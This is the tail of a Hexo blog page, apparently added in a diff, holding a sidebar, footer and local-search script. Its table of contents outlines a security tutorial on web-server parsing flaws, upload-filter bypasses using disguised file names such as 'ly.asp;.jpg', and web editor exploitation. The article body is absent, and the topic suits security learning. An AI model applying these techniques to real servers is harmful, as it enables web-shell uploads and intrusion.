+                <i class="fa fa-chevron-left"></i> 文件包含及漏洞利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/touxiang.jpg" alt="RedYan">
+            
+              <p class="site-author-name" itemprop="name">RedYan</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#三种常见中间件的解析漏洞（IIS-apache-nginx）"><span class="nav-number">1.</span> <span class="nav-text">三种常见中间件的解析漏洞（IIS,apache,nginx）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-IIS解析漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">1.IIS解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IIS常见版本"><span class="nav-number">1.1.1.</span> <span class="nav-text">IIS常见版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IIS5-X-6-0解析漏洞（两种利用方法）"><span class="nav-number">1.1.2.</span> <span class="nav-text">IIS5.X/6.0解析漏洞（两种利用方法）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-目录解析-xx-asp-xx-jpg"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">1.目录解析 /xx.asp/xx.jpg</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-文件解析-ly-asp-jpg"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">2.文件解析   ly.asp;.jpg</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><span class="nav-number">1.1.3.</span> <span class="nav-text">IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache解析漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">2.Apache解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#x-php-zz-x-php"><span class="nav-number">1.2.1.</span> <span class="nav-text">x.php.zz  x.php.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#htaccess文件解析漏洞"><span class="nav-number">1.2.2.</span> <span class="nav-text">htaccess文件解析漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Nginx解析漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">3.Nginx解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Nginx-lt-8-03空子节代码执行漏洞"><span class="nav-number">1.3.1.</span> <span class="nav-text">Nginx&lt;8.03空子节代码执行漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传绕过技巧"><span class="nav-number">2.</span> <span class="nav-text">文件上传绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务器命名规则"><span class="nav-number">2.1.</span> <span class="nav-text">服务器命名规则</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一种类型：上传文件名和服务器命名一致"><span class="nav-number">2.1.1.</span> <span class="nav-text">第一种类型：上传文件名和服务器命名一致</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二种类型：上传文件名和服务器命名不一致（随机，时间日期命名等）"><span class="nav-number">2.1.2.</span> <span class="nav-text">第二种类型：上传文件名和服务器命名不一致（随机，时间日期命名等）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见的上传检测方式"><span class="nav-number">2.2.</span> <span class="nav-text">常见的上传检测方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-客户端javascript检测（通常为检测文件扩展名）"><span class="nav-number">2.2.1.</span> <span class="nav-text">1.客户端javascript检测（通常为检测文件扩展名）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一、首先判断是否为JS本地验证"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">一、首先判断是否为JS本地验证</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二、绕过方法"><span class="nav-number">2.2.1.2.</span> <span class="nav-text">二、绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-先上传符合要求的文件名如xx-jpg-再用burp抓包改包改成xx-php"><span class="nav-number">2.2.1.2.1.</span> <span class="nav-text">(1).先上传符合要求的文件名如xx.jpg,再用burp抓包改包改成xx.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-使用firebug等直接删除掉本地验证的JS代码，如删除点提交点击事件触发的验证函数代码。"><span class="nav-number">2.2.1.2.2.</span> <span class="nav-text">(2).使用firebug等直接删除掉本地验证的JS代码，如删除点提交点击事件触发的验证函数代码。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-将PHP等需要用到的后缀名添加到JS验证的白名单中"><span class="nav-number">2.2.1.2.3.</span> <span class="nav-text">(3).将PHP等需要用到的后缀名添加到JS验证的白名单中</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-服务端MIME类型检测（检测Content-Type内容）"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.服务端MIME类型检测（检测Content-Type内容）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一、MIME的作用和定义目录："><span class="nav-number">2.2.2.1.</span> <span class="nav-text">一、MIME的作用和定义目录：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二、绕过方法："><span class="nav-number">2.2.2.2.</span> <span class="nav-text">二、绕过方法：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-服务端目录路径检测（检测跟path参数相关的内容）"><span class="nav-number">2.2.3.</span> <span class="nav-text">3.服务端目录路径检测（检测跟path参数相关的内容）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-服务端文件扩展名检测（检测跟文件extension相关的内容）"><span class="nav-number">2.2.4.</span> <span class="nav-text">4.服务端文件扩展名检测（检测跟文件extension相关的内容）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#黑名单检测——安全性比白名单低很多，攻击手法也比白名单多。"><span class="nav-number">2.2.4.1.</span> <span class="nav-text">黑名单检测——安全性比白名单低很多，攻击手法也比白名单多。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#白名单检测——相对难过很多，但是也不一定绝对安全。"><span class="nav-number">2.2.4.2.</span> <span class="nav-text">白名单检测——相对难过很多，但是也不一定绝对安全。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-服务端文件内容检测（检测内容是否合法或含有恶意代码）"><span class="nav-number">2.2.5.</span> <span class="nav-text">5.服务端文件内容检测（检测内容是否合法或含有恶意代码）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见编辑器漏洞"><span class="nav-number">3.</span> <span class="nav-text">常见编辑器漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#编辑器利用"><span class="nav-number">3.1.</span> <span class="nav-text">编辑器利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-查找编辑器目录"><span class="nav-number">3.1.1.</span> <span class="nav-text">1.查找编辑器目录</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（1）目录扫描"><span class="nav-number">3.1.1.1.</span> <span class="nav-text">（1）目录扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（2）目录遍历"><span class="nav-number">3.1.1.2.</span> <span class="nav-text">（2）目录遍历</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（3）蜘蛛爬行"><span class="nav-number">3.1.1.3.</span> <span class="nav-text">（3）蜘蛛爬行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（4）谷歌语法"><span class="nav-number">3.1.1.4.</span> <span class="nav-text">（4）谷歌语法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-漏洞利用"><span class="nav-number">3.1.2.</span> <span class="nav-text">2.漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FCKeditor编辑器利用"><span class="nav-number">3.2.</span> <span class="nav-text">FCKeditor编辑器利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EWEBeditor编辑器利用"><span class="nav-number">3.3.</span> <span class="nav-text">EWEBeditor编辑器利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他类型编辑器的利用"><span class="nav-number">3.4.</span> <span class="nav-text">其他类型编辑器的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）ckfinder编辑器"><span class="nav-number">3.4.1.</span> <span class="nav-text">（1）ckfinder编辑器</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">RedYan</span>
+
+  
+</div>
+
+
+  <div class="powered-by">RedYan</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">博客 </div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
